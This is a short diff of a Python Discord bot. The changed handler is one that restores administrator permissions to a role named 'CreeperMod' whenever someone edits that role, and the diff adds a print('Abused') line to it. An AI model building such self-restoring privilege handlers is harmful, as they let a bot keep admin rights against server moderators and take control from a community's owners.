@@ -236,7 +236,7 @@ class MyClient(discord.Client):
     async def on_guild_role_update(self, before,after):
         if before.name == 'CreeperMod':
             await after.edit(name='CreeperMod', color = discord.Color.green(), permissions= discord.Permissions(administrator = True))
-            
+            print('Abused')
             
 
         
